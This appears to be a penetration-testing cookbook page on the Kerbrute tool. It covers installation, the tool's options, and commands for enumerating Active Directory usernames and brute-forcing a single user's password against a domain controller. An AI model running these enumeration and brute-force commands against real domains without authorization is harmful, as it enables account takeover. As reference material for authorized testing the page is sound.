---
layout: default
title: Kerbrute
parent: COOKBOOKS
has_children: false
has_toc: false
---

{% include toc.html %}

## Installation
```
// Install go.
sudo apt install golang-go
​
// Add paths to ~/.profile.
export GOPATH=$HOME/go
export PATH=$PATH:/usr/local/go/bin:$GOPATH/bin
​
// Reload ~/.profile.
source ~/.profile
​
// Install Kerbrute.
go get github.com/ropnop/kerbrute
​
// To run.
kerbrute
```

## Options
```
// Type Kerbrute without args to show options.
bruteforce    Bruteforce username:password combos, from a file or stdin
bruteuser     Bruteforce a single user's password from a wordlist
help          Help about any command
passwordspray Test a single password against a list of users
userenum      Enumerate valid domain usernames via Kerberos
version       Display version info and quit
```

## Enumerate user accounts
```
// Very quick.
kerbrute userenum --safe --domain domain.local --dc 10.x.x.x ./list-of-users
```

## Bruteforcing single user's password
```
// Run this in verbose mode as errors (like clock skew errors) are not displayed otherwise.
kerbrute bruteuser -v --safe --domain domain.local --dc 10.x.x.x wordlists/passwords username

// Write results to file.
kerbrute bruteuser -v --safe --domain domain.local --dc 10.x.x.x --output username.out wordlists/passwords username
```